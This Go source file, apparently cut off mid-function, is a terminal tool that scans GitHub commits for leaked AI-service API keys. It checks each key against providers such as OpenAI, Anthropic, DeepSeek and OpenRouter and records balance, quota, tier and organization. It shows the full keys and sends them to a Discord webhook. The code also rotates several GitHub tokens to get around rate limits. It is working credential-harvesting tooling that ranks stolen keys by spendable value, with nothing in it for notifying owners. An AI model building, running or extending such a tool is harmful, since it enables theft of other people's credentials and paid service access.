package main

import (
        "bufio"
        "bytes"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "net/http"
        "os"
        "regexp"
        "strings"
        "sync"
        "sync/atomic"
        "time"

        tea "github.com/charmbracelet/bubbletea"
        "github.com/charmbracelet/lipgloss"
        "github.com/spf13/viper"
)

// ─── Config ──────────────────────────────────────────────────────────────────

type Config struct {
        GitHubToken       string            `mapstructure:"github_token"`
        DiscordWebhook    string            `mapstructure:"discord_webhook"`
        Signatures        map[string]string `mapstructure:"signatures"`
        EnableVerify      bool              `mapstructure:"enable_verify"`
        VerifyWorkers     int               `mapstructure:"verify_workers"`
        VerifyTimeout     int               `mapstructure:"verify_timeout"`
}

// ─── Token Pool (round-robin with rate-limit awareness) ─────────────────────

type TokenPool struct {
        tokens []string
        index  uint64 // atomically incremented via sync/atomic
}

func NewTokenPool(tokenStr string) *TokenPool {
        // Split by comma or newline, trim spaces, skip empties
        raw := strings.ReplaceAll(tokenStr, "\n", ",")
        parts := strings.Split(raw, ",")
        var tokens []string
        for _, p := range parts {
                t := strings.TrimSpace(p)
                if t != "" {
                        tokens = append(tokens, t)
                }
        }
        if len(tokens) == 0 {
                tokens = []string{""}
        }
        return &TokenPool{tokens: tokens}
}

func (tp *TokenPool) Next() string {
        i := atomic.AddUint64(&tp.index, 1)
        return tp.tokens[i%uint64(len(tp.tokens))]
}

func (tp *TokenPool) Count() int {
        return len(tp.tokens)
}

// ─── Regex Rules ─────────────────────────────────────────────────────────────

type Rule struct {
        Name       string
        Regex      *regexp.Regexp
        CanVerify  bool
        Provider   string
}

// ─── Scan Job ────────────────────────────────────────────────────────────────

type ScanJob struct {
        RepoName  string
        CommitUrl string
}

// ─── Match (raw regex hit, pre-verification) ────────────────────────────────

type RawMatch struct {
        Rule      string
        Provider  string
        Text      string
        Repo      string
        CommitUrl string
        CanVerify bool
}

// ─── Verified Match (after provider API check) ──────────────────────────────

type VerifiedMatch struct {
        Provider   string
        Key        string
        Redacted   string
        Valid      bool   // true = verified working, false = invalid/dead
        Status     string
        Details    string
        Balance    string
        Quota      string
        Tier       string
        KeyType    string // e.g. "Project", "Legacy", "Live", "Test", "Bot"
        Org        string // e.g. org name for OpenAI, team for Slack
        Models     string // e.g. "47 models accessible"
        Repo       string
        CommitUrl  string
}

// ─── Discord Webhook Payload ────────────────────────────────────────────────

type DiscordEmbedField struct {
        Name   string `json:"name"`
        Value  string `json:"value"`
        Inline bool   `json:"inline"`
}

type DiscordEmbed struct {
        Title       string               `json:"title"`
        Description string               `json:"description"`
        Color       int                  `json:"color"`
        Fields      []DiscordEmbedField  `json:"fields"`
        Footer      *DiscordEmbedFooter  `json:"footer,omitempty"`
}

type DiscordEmbedFooter struct {
        Text string `json:"text"`
}

type DiscordPayload struct {
        Embeds []DiscordEmbed `json:"embeds"`
}

// ─── TUI Messages ────────────────────────────────────────────────────────────

type MsgFetchedCommits struct{ Count int }
type MsgScanStarted struct{ CommitUrl string }
type MsgScanCompleted struct{ CommitUrl string }
type MsgRawMatchFound struct {
        Rule      string
        Provider  string
        Text      string
        Repo      string
        CommitUrl string
        CanVerify bool
}
type MsgVerifiedMatch struct {
        Provider   string
        Key        string
        Redacted   string
        Valid      bool
        Status     string
        Details    string
        Balance    string
        Quota      string
        Tier       string
        KeyType    string
        Org        string
        Models     string
        Repo       string
        CommitUrl  string
}
type MsgRateLimit struct {
        Remaining int
        Limit     int
}
type MsgStatusUpdate struct{ Status string }
type MsgWebhookResult struct {
        Success  bool
        Provider string
        Err      string
}

// ─── TUI Model ──────────────────────────────────────────────────────────────

type tuiModel struct {
        totalFound       int
        totalScanned     int
        totalRawHits     int
        totalValid       int
        totalInvalid     int
        totalWebhookOK   int
        totalWebhookFail int
        tokenCount       int
        recentKeys       []MsgVerifiedMatch
        status           string
        rateLimitLimit   int
        rateLimitRemain  int
        activeWorkers    int
}

func (m tuiModel) Init() tea.Cmd { return nil }

func (m tuiModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
        switch msg := msg.(type) {
        case tea.KeyMsg:
                switch msg.String() {
                case "q", "ctrl+c":
                        return m, tea.Quit
                }
        case MsgFetchedCommits:
                m.totalFound += msg.Count
        case MsgScanStarted:
                m.status = fmt.Sprintf("Scanning commit: %s", msg.CommitUrl)
        case MsgScanCompleted:
                m.totalScanned++
        case MsgRawMatchFound:
                m.totalRawHits++
        case MsgVerifiedMatch:
                if msg.Valid {
                        m.totalValid++
                } else {
                        m.totalInvalid++
                }
                m.recentKeys = append(m.recentKeys, msg)
                if len(m.recentKeys) > 15 {
                        m.recentKeys = m.recentKeys[len(m.recentKeys)-15:]
                }
                if msg.Valid && msg.Balance != "" {
                        m.status = fmt.Sprintf("💰 %s key verified! Balance: %s", msg.Provider, msg.Balance)
                } else if !msg.Valid {
                        m.status = fmt.Sprintf("❌ %s key INVALID (%s)", msg.Provider, msg.Details)
                }
        case MsgRateLimit:
                m.rateLimitRemain = msg.Remaining
                m.rateLimitLimit = msg.Limit
        case MsgStatusUpdate:
                m.status = msg.Status
        case MsgWebhookResult:
                if msg.Success {
                        m.totalWebhookOK++
                        m.status = fmt.Sprintf("Webhook sent: %s key", msg.Provider)
                } else {
                        m.totalWebhookFail++
                        m.status = fmt.Sprintf("Webhook FAILED: %s (%s)", msg.Provider, msg.Err)
                }
        }
        return m, nil
}

func (m tuiModel) View() string {
        var s string

        s += titleStyle.Render("🔑 Key Scanner + Verifier") + "\n\n"

        var stats string
        stats += fmt.Sprintf("Status: %s\n", accentStyle.Render(m.status))
        stats += fmt.Sprintf("Found: %d commits\n", m.totalFound)
        stats += fmt.Sprintf("Scanned: %d commits\n", m.totalScanned)
        stats += fmt.Sprintf("Raw Matches: %d\n", m.totalRawHits)
        stats += fmt.Sprintf("Valid Keys: %s", greenStyle.Render(fmt.Sprintf("%d", m.totalValid)))
        if m.totalInvalid > 0 {
                stats += fmt.Sprintf(" | Invalid: %s", redStyle.Render(fmt.Sprintf("%d", m.totalInvalid)))
        }
        stats += "\n"
        stats += fmt.Sprintf("Webhook Sent: %s", greenStyle.Render(fmt.Sprintf("%d", m.totalWebhookOK)))
        if m.totalWebhookFail > 0 {
                stats += fmt.Sprintf(" | Failed: %s", redStyle.Render(fmt.Sprintf("%d", m.totalWebhookFail)))
        }
        stats += "\n"
        stats += fmt.Sprintf("Workers: %d active\n", m.activeWorkers)
        stats += fmt.Sprintf("GitHub Tokens: %s\n", greenStyle.Render(fmt.Sprintf("%d", m.tokenCount)))

        rlStr := "N/A"
        if m.rateLimitLimit > 0 {
                rlStr = fmt.Sprintf("%d/%d", m.rateLimitRemain, m.rateLimitLimit)
                if m.rateLimitRemain < 10 {
                        rlStr = redStyle.Render(rlStr)
                } else {
                        rlStr = greenStyle.Render(rlStr)
                }
        }
        stats += fmt.Sprintf("Rate Limit:   %s\n", rlStr)

        s += borderStyle.Render(stats) + "\n"

        s += accentStyle.Render("🔑 Recent Keys:") + "\n"
        if len(m.recentKeys) == 0 {
                s += "  No keys found yet.\n"
        } else {
                for _, hit := range m.recentKeys {
                        if hit.Valid {
                                s += fmt.Sprintf("  [%s] %s in %s\n", greenStyle.Render("VALID"), accentStyle.Render(hit.Provider), hit.Repo)
                                s += fmt.Sprintf("  ↳ Key: %s\n", hit.Key)
                                if hit.KeyType != "" {
                                        s += fmt.Sprintf("  ↳ Type: %s\n", hit.KeyType)
                                }
                                if hit.Models != "" {
                                        s += fmt.Sprintf("  ↳ Models: %s\n", hit.Models)
                                }
                                if hit.Org != "" {
                                        s += fmt.Sprintf("  ↳ Org: %s\n", hit.Org)
                                }
                                if hit.Balance != "" {
                                        s += fmt.Sprintf("  ↳ 💰 Balance: %s\n", greenStyle.Render(hit.Balance))
                                }
                                if hit.Quota != "" {
                                        s += fmt.Sprintf("  ↳ Quota: %s\n", hit.Quota)
                                }
                                if hit.Tier != "" {
                                        s += fmt.Sprintf("  ↳ Tier: %s\n", hit.Tier)
                                }
                        } else {
                                s += fmt.Sprintf("  [%s] %s in %s\n", redStyle.Render("INVALID"), accentStyle.Render(hit.Provider), hit.Repo)
                                s += fmt.Sprintf("  ↳ Key: %s\n", hit.Key)
                                s += fmt.Sprintf("  ↳ Reason: %s\n", redStyle.Render(hit.Details))
                        }
                        s += fmt.Sprintf("  ↳ Commit: %s\n\n", hit.CommitUrl)
                }
        }

        s += "\n" + helpStyle.Render("Press 'q' or 'Ctrl+C' to exit.") + "\n"
        return s
}

// ─── Styles ──────────────────────────────────────────────────────────────────

var (
        titleStyle = lipgloss.NewStyle().
                        Bold(true).
                        Foreground(lipgloss.Color("#FAFAFA")).
                        Background(lipgloss.Color("#7D56F4")).
                        Padding(0, 1).
                        MarginBottom(1)
        accentStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#7D56F4")).
                        Bold(true)
        greenStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#04B575")).
                        Bold(true)
        redStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#FF5555")).
                        Bold(true)
        borderStyle = lipgloss.NewStyle().
                        Border(lipgloss.RoundedBorder()).
                        BorderForeground(lipgloss.Color("#874BFD")).
                        Padding(1).
                        MarginBottom(1).
                        Width(70)
        helpStyle = lipgloss.NewStyle().
                        Foreground(lipgloss.Color("#6272A4")).
                        Italic(true)
)

// ─── Config Init ─────────────────────────────────────────────────────────────

func initViper(cfg *Config) error {
        viper.SetConfigName("config")
        viper.SetConfigType("toml")
        viper.AddConfigPath(".")

        viper.SetDefault("enable_verify", true)
        viper.SetDefault("verify_workers", 20)
        viper.SetDefault("verify_timeout", 15)

        if err := viper.ReadInConfig(); err != nil {
                log.Fatalf("error loading config: %v", err)
                return err
        }
        if err := viper.Unmarshal(cfg); err != nil {
                log.Fatalf("error unmarshaling config: %v", err)
                return err
        }

        log.Println("Loaded config:")
        log.Printf("  GitHub Token: %s... (%d tokens in pool)", redact(cfg.GitHubToken, 8), NewTokenPool(cfg.GitHubToken).Count())
        log.Printf("  Discord Webhook: %v", cfg.DiscordWebhook != "")
        log.Printf("  Enable Verify: %v", cfg.EnableVerify)
        log.Printf("  Verify Workers: %d", cfg.VerifyWorkers)
        for k, v := range cfg.Signatures {
                log.Printf("  Signature: %s = %s", k, v)
        }
        return nil
}

// ─── Redaction ───────────────────────────────────────────────────────────────

func redact(s string, show int) string {
        s = strings.TrimSpace(s)
        if len(s) <= show*2+4 {
                return strings.Repeat("*", len(s))
        }
        return s[:show] + strings.Repeat("*", len(s)-show*2) + s[len(s)-show:]
}

// ─── Key Extraction from Diff Line ──────────────────────────────────────────

func extractKey(text string, rule *Rule) string {
        loc := rule.Regex.FindStringIndex(text)
        if loc == nil {
                return ""
        }
        return rule.Regex.FindString(text[loc[0]:])
}

// VerifyResult holds verification output including balance/quota/tier info

type VerifyResult struct {
        Valid   bool
        Details string
        Balance string
        Quota   string
        Tier    string
        KeyType string
        Org     string
        Models  string
}

// ─── Verification Logic ─────────────────────────────────────────────────────

func verifyKey(provider string, key string, timeout time.Duration) VerifyResult {
        client := &http.Client{Timeout: timeout}

        switch provider {
        case "openai":
                return verifyOpenAI(client, key)
        case "anthropic":
                return verifyAnthropic(client, key)
        case "mistral":
                return verifyMistral(client, key)
        case "openrouter":
                return verifyOpenRouter(client, key)
        case "elevenlabs":
                return verifyElevenLabs(client, key)
        case "deepseek":
                return verifyDeepSeek(client, key)
        case "xai":
                return verifyXAI(client, key)
        case "huggingface":
                return verifyHuggingFace(client, key)
        case "groq":
                return verifyGroq(client, key)
        case "replicate":
                return verifyReplicate(client, key)
        case "perplexity":
                return verifyPerplexity(client, key)
        case "together":
                return verifyTogether(client, key)
        case "fireworks":
                return verifyFireworks(client, key)
        case "cohere":
                return verifyCohere(client, key)
        case "ai21":
                return verifyAI21(client, key)
        default:
                return VerifyResult{Valid: true, Details: "regex-only"}
        }
}

func failResult(detail string) VerifyResult {
        return VerifyResult{Valid: false, Details: detail}
}

func okResult(detail string) VerifyResult {
        return VerifyResult{Valid: true, Details: detail}
}

func verifyOpenAI(client *http.Client, key string) VerifyResult {
        // Step 1: Check if key is valid + get models
        req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        bodyBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 403 {
                return okResult("valid / forbidden (org restricted)")
        }
        if resp.StatusCode != 200 && resp.StatusCode != 429 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid / has access"}

        // Detect key type
        if strings.HasPrefix(key, "sk-proj-") {
                result.KeyType = "Project"
        } else {
                result.KeyType = "Legacy"
        }

        if resp.StatusCode == 429 {
                result.Details = "valid / rate-limited"
        }

        // Step 2: Get org info + quota from /v1/me
        meReq, _ := http.NewRequest("GET", "https://api.openai.com/v1/me", nil)
        meReq.Header.Set("Authorization", "Bearer "+key)
        meResp, err := client.Do(meReq)
        if err == nil && meResp.StatusCode == 200 {
                var meData map[string]interface{}
                meBytes, _ := io.ReadAll(meResp.Body)
                meResp.Body.Close()
                json.Unmarshal(meBytes, &meData)
                if orgs, ok := meData["orgs"].(map[string]interface{}); ok {
                        if data, ok := orgs["data"].([]interface{}); ok && len(data) > 0 {
                                for _, o := range data {
                                        if org, ok := o.(map[string]interface{}); ok {
                                                if name, ok := org["name"].(string); ok {
                                                        result.Org = name
                                                        result.Details = "valid"
                                                }
                                        }
                                }
                        }
                }
        }

        // Step 3: Check quota by making a tiny completion request
        chatBody := `{"model":"gpt-4o-mini","messages":[{"role":"user","content":""}],"max_tokens":1}`
        chatReq, _ := http.NewRequest("POST", "https://api.openai.com/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatBytes, _ := io.ReadAll(chatResp.Body)
                chatResp.Body.Close()

                // Get RPM from rate limit header
                if rpm := chatResp.Header.Get("X-Ratelimit-Limit-Requests"); rpm != "" {
                        result.Quota = rpm + " RPM"
                }

                // Get TPM for tier detection
                tpm := 0
                if tpmStr := chatResp.Header.Get("X-Ratelimit-Limit-Tokens"); tpmStr != "" {
                        fmt.Sscanf(tpmStr, "%d", &tpm)
                }
                result.Tier = openAITier(tpm)

                if chatResp.StatusCode == 429 || chatResp.StatusCode == 400 {
                        var errData map[string]interface{}
                        json.Unmarshal(chatBytes, &errData)
                        if errObj, ok := errData["error"].(map[string]interface{}); ok {
                                if errType, ok := errObj["type"].(string); ok {
                                        switch errType {
                                        case "insufficient_quota":
                                                result.Quota = "NO QUOTA"
                                        case "invalid_request_error":
                                                result.Quota = chatResp.Header.Get("X-Ratelimit-Limit-Requests") + " RPM (active)"
                                        case "billing_not_active":
                                                result.Quota = "BILLING NOT ACTIVE"
                                        }
                                }
                        }
                }
        }

        // Count accessible models from the first response
        if resp.StatusCode == 200 {
                var modelsData map[string]interface{}
                json.Unmarshal(bodyBytes, &modelsData)
                if data, ok := modelsData["data"].([]interface{}); ok {
                        result.Models = fmt.Sprintf("%d accessible", len(data))
                        result.Details = "valid"
                }
        }

        return result
}

func openAITier(tpm int) string {
        switch {
        case tpm >= 40000000:
                return "Tier 5"
        case tpm >= 4000000:
                return "Tier 4"
        case tpm >= 2000000:
                return "Tier 3"
        case tpm >= 1000000:
                return "Tier 2"
        case tpm >= 500000:
                return "Tier 1"
        default:
                return "Free"
        }
}

func verifyAnthropic(client *http.Client, key string) VerifyResult {
        body := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
        req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewBufferString(body))
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("anthropic-version", "2023-06-01")
        req.Header.Set("x-api-key", key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        result := VerifyResult{Valid: true}

        // Get tier from rate limit header
        if rl := resp.Header.Get("Anthropic-Ratelimit-Requests-Limit"); rl != "" {
                var rpm int
                fmt.Sscanf(rl, "%d", &rpm)
                result.Quota = fmt.Sprintf("%s RPM", rl)
                switch {
                case rpm >= 4000:
                        result.Tier = "Tier 4"
                case rpm >= 2000:
                        result.Tier = "Tier 3"
                case rpm >= 1000:
                        result.Tier = "Tier 2"
                case rpm >= 50:
                        result.Tier = "Tier 1"
                default:
                        result.Tier = "Free"
                }
        }

        if resp.StatusCode == 200 {
                result.Details = "valid"
                return result
        }
        if resp.StatusCode == 429 {
                result.Details = "valid / rate-limited"
                return result
        }
        if resp.StatusCode == 400 {
                result.Details = "valid / bad request (key works)"
                return result
        }
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }

        // Check for quota errors in response body
        var errData map[string]interface{}
        json.Unmarshal(respBytes, &errData)
        if errObj, ok := errData["error"].(map[string]interface{}); ok {
                if msg, ok := errObj["message"].(string); ok {
                        if strings.Contains(msg, "credit balance is too low") || strings.Contains(msg, "usage limits") {
                                result.Valid = true
                                result.Details = "valid / no quota"
                                result.Quota = "NO QUOTA"
                                return result
                        }
                        if strings.Contains(msg, "organization has been disabled") {
                                return failResult("org disabled")
                        }
                }
        }

        return failResult(fmt.Sprintf("status %d", resp.StatusCode))
}


func verifyMistral(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.mistral.ai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        // Count models
        var modelsData map[string]interface{}
        json.Unmarshal(respBytes, &modelsData)
        if data, ok := modelsData["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(data))
        }

        // Check subscription by trying a chat request
        chatBody := `{"model":"open-mistral-7b","messages":[{"role":"user","content":""}],"max_tokens":-1}`
        chatReq, _ := http.NewRequest("POST", "https://api.mistral.ai/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatResp.Body.Close()
                if chatResp.StatusCode == 422 {
                        result.Tier = "Active subscription"
                } else {
                        result.Tier = "Free / no sub"
                }
        }

        return result
}

func verifyOpenRouter(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://openrouter.ai/api/v1/auth/key", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var authData map[string]interface{}
        json.Unmarshal(respBytes, &authData)
        if data, ok := authData["data"].(map[string]interface{}); ok {
                if usage, ok := data["usage"].(float64); ok {
                        result.Balance = fmt.Sprintf("$%.4f used", usage)
                }
                if limit, ok := data["limit"].(float64); ok {
                        if limit > 0 {
                                result.Balance += fmt.Sprintf(" / $%.2f limit", limit)
                                if usage, ok := data["usage"].(float64); ok {
                                        remaining := limit - usage
                                        if remaining > 0 {
                                                result.Balance += fmt.Sprintf(" ($%.4f remaining)", remaining)
                                        } else {
                                                result.Quota = "LIMIT REACHED"
                                        }
                                }
                        } else {
                                result.Balance += " / no limit"
                        }
                }
                if isFree, ok := data["is_free_tier"].(bool); ok && !isFree {
                        result.Tier = "Paid"
                } else {
                        result.Tier = "Free tier"
                }
                if rl, ok := data["rate_limit"].(map[string]interface{}); ok {
                        if reqs, ok := rl["requests"].(float64); ok {
                                result.Quota = fmt.Sprintf("%.0f RPM", reqs)
                        }
                }
        }

        return result
}

func verifyElevenLabs(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.elevenlabs.io/v1/user/subscription", nil)
        req.Header.Set("xi-api-key", key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var subData map[string]interface{}
        json.Unmarshal(respBytes, &subData)

        if charLimit, ok := subData["character_limit"].(float64); ok {
                if charCount, ok := subData["character_count"].(float64); ok {
                        remaining := int(charLimit) - int(charCount)
                        result.Balance = fmt.Sprintf("%d / %d chars remaining", remaining, int(charLimit))
                }
        }
        if tier, ok := subData["tier"].(string); ok {
                result.Tier = tier
        }
        if canExtend, ok := subData["can_extend_character_limit"].(bool); ok {
                if canExtend {
                        if allowed, ok := subData["allowed_to_extend_character_limit"].(bool); ok && allowed {
                                result.Quota = "Unlimited (extendable)"
                        }
                }
        }

        return result
}

func verifyDeepSeek(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.deepseek.com/user/balance", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 429 {
                return failResult("rate-limited")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var balData map[string]interface{}
        json.Unmarshal(respBytes, &balData)

        if isAvail, ok := balData["is_available"].(bool); ok {
                if !isAvail {
                        result.Quota = "Not available"
                }
        }

        if balanceInfos, ok := balData["balance_infos"].([]interface{}); ok {
                totalUSD := 0.0
                for _, bi := range balanceInfos {
                        if info, ok := bi.(map[string]interface{}); ok {
                                if bal, ok := info["total_balance"].(string); ok {
                                        var f float64
                                        _, _ = fmt.Sscanf(bal, "%f", &f)
                                        if currency, ok := info["currency"].(string); ok && currency == "CNY" {
                                                f *= 0.14
                                        }
                                        totalUSD += f
                                }
                        }
                }
                result.Balance = fmt.Sprintf("$%.2f USD", totalUSD)
        }

        return result
}

func verifyXAI(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.x.ai/v1/api-key", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}

        var keyData map[string]interface{}
        json.Unmarshal(respBytes, &keyData)

        if blocked, ok := keyData["team_blocked"].(bool); ok && blocked {
                result.Quota = "BLOCKED"
        }
        if blocked, ok := keyData["api_key_blocked"].(bool); ok && blocked {
                result.Quota = "BLOCKED"
        }
        if disabled, ok := keyData["api_key_disabled"].(bool); ok && disabled {
                result.Quota = "DISABLED"
        }

        // Test if sub is active
        chatBody := `{"messages":[],"model":"grok-3-mini-latest","frequency_penalty":-3.0}`
        chatReq, _ := http.NewRequest("POST", "https://api.x.ai/v1/chat/completions", bytes.NewBufferString(chatBody))
        chatReq.Header.Set("Authorization", "Bearer "+key)
        chatReq.Header.Set("Content-Type", "application/json")
        chatResp, err := client.Do(chatReq)
        if err == nil {
                chatResp.Body.Close()
                if chatResp.StatusCode == 200 || chatResp.StatusCode == 400 {
                        result.Tier = "Active"
                } else {
                        result.Tier = "Inactive"
                }
        }

        return result
}

func verifyHuggingFace(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://huggingface.co/api/whoami-v2", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if name, ok := data["name"].(string); ok {
                result.Details = "valid / user: " + name
        }
        if fullname, ok := data["fullname"].(string); ok {
                result.Tier = fullname
        }
        // Check if Pro
        if auth, ok := data["auth"].(map[string]interface{}); ok {
                if accessToken, ok := auth["accessToken"].(map[string]interface{}); ok {
                        if pro, ok := accessToken["isPro"].(bool); ok && pro {
                                result.Tier = "Pro"
                        }
                }
        }
        return result
}

func verifyGroq(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.groq.com/openai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }
        // Check rate limit headers
        if rl := resp.Header.Get("X-Ratelimit-Limit-Requests"); rl != "" {
                result.Quota = rl + " RPM"
        }
        return result
}

func verifyReplicate(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.replicate.com/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }
        return VerifyResult{Valid: true, Details: "valid"}
}

func verifyPerplexity(client *http.Client, key string) VerifyResult {
        // Perplexity doesn't have a /models endpoint, try a tiny completion
        body := `{"model":"llama-3.1-sonar-small-128k-online","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
        req, _ := http.NewRequest("POST", "https://api.perplexity.ai/chat/completions", bytes.NewBufferString(body))
        req.Header.Set("Authorization", "Bearer "+key)
        req.Header.Set("Content-Type", "application/json")
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode == 200 {
                return okResult("valid")
        }
        if resp.StatusCode == 429 {
                return okResult("valid / rate-limited")
        }
        if resp.StatusCode == 400 {
                return okResult("valid / bad request (key works)")
        }
        return failResult(fmt.Sprintf("status %d", resp.StatusCode))
}

func verifyTogether(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.together.xyz/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }

        // Check billing/credits
        balReq, _ := http.NewRequest("GET", "https://api.together.xyz/api/account/balance", nil)
        balReq.Header.Set("Authorization", "Bearer "+key)
        balResp, err := client.Do(balReq)
        if err == nil && balResp.StatusCode == 200 {
                balBytes, _ := io.ReadAll(balResp.Body)
                balResp.Body.Close()
                var balData map[string]interface{}
                json.Unmarshal(balBytes, &balData)
                if walletInfo, ok := balData["wallet_info"].(map[string]interface{}); ok {
                        if credits, ok := walletInfo["credits"].(float64); ok {
                                result.Balance = fmt.Sprintf("$%.2f", credits)
                        }
                }
        }

        return result
}

func verifyFireworks(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.fireworks.ai/inference/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
        if resp.StatusCode != 200 {
                return failResult(fmt.Sprintf("status %d", resp.StatusCode))
        }

        result := VerifyResult{Valid: true, Details: "valid"}
        var data map[string]interface{}
        json.Unmarshal(respBytes, &data)
        if models, ok := data["data"].([]interface{}); ok {
                result.Details = fmt.Sprintf("valid / %d models", len(models))
        }
        return result
}

func verifyCohere(client *http.Client, key string) VerifyResult {
        req, _ := http.NewRequest("GET", "https://api.cohere.ai/v1/models", nil)
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
                return failResult("request error")
        }
        respBytes, _ := io.ReadAll(resp.Body)
        resp.Body.Close()
        if resp.StatusCode == 401 {
                return failResult("unauthorized")
        }
